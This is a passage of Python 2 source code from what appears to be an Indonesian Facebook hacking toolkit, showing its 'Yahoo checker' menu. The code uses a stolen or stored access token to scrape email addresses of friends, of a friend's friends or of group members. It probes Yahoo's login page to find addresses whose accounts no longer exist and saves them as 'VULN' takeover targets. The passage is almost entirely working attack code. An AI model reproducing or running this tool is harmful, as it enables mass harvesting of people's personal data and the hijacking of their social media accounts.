		print "\033[1;91m[!] Wrong"
		tanyaw()
	elif why =="y":
		wordlist()
	elif why =="Y":
		wordlist()
	elif why =="n":
		menu_hack()
	elif why =="N":
		menu_hack()
	else:
		print "\033[1;91m[!] Wrong"
		tanyaw()
		
##### YAHOO CHECKER #####
#---------------------------------------------------#
def menu_yahoo():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m With list friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Clone from friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Clone from member group"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Using file"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	yahoo_pilih()
#----pilih
def yahoo_pilih():
	go = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if go =="":
		print "\033[1;91m[!] Wrong"
		yahoo_pilih()
	elif go =="1":
		yahoofriends()
	elif go =="2":
		yahoofromfriends()
	elif go =="3":
		yahoomember()
	elif go =="4":
		yahoolist()
	elif go =="0":
		menu_hack()
	else:
		print "\033[1;91m[!] Wrong"
		yahoo_pilih()
		
##### LIST FRIEND #####
def yahoofriends():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	mpsh = []
	jml = 0
	jalan('\033[1;91m[✺] \033[1;92mGetting email friend \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/MailVuln.txt','w')
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/MailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()

##### CLONE FROM FRIEND #####
def yahoofromfriends():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	mpsh = []
	jml = 0
	idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
	except KeyError:
		print"\033[1;91m[!] Friend not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_yahoo()
	jalan('\033[1;91m[✺] \033[1;92mGetting email from friend \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/FriendMailVuln.txt','w')
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/FriendMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()
	
##### YAHOO MEMBER #####
def yahoomember():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	mpsh = []
	jml = 0
	id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_yahoo()
	jalan('\033[1;91m[✺] \033[1;92mGetting email from group \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/GrupMailVuln.txt','w')
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()
		
##### YAHOO FILE #####
def yahoolist():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	files = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m: \033[1;97m")
	try:
		total = open(files,"r")
		mail = total.readlines()
	except IOError:
		print"\033[1;91m[!] File not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_yahoo()
	mpsh = []
	jml = 0
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	save = open('out/FileMailVuln.txt','w')
	print 42*"\033[1;97m═"
	mail = open(files,"r").readlines()
	for pw in mail:
		mail = pw.replace("\n","")
		jml +=1
		mpsh.append(jml)
		yahoo = re.compile(r'@.*')
		otw = yahoo.search(mail).group()
		if 'yahoo.com' in otw:
			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br._factory.is_html = True
			br.select_form(nr=0